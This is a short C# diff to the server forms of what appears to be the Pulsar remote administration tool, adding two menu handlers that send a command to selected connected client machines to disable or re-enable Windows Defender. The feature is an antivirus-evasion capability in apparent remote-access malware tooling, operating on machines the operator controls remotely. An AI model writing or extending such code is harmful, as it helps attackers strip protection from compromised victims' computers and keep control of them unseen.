@@ -5766,6 +5766,24 @@ namespace Pulsar.Server.Forms
                 c.Send(new DoClearTempDirectory());
             }
         }
+
+        private void enableDefenderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This will enable/restore Windows Defender
+                c.Send(new DoDisableDefender(false));
+            }
+        }
+
+        private void disableDefenderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This will disable Windows Defender
+                c.Send(new DoDisableDefender(true));
+            }
+        }
     }
 
     public class NotificationEntry
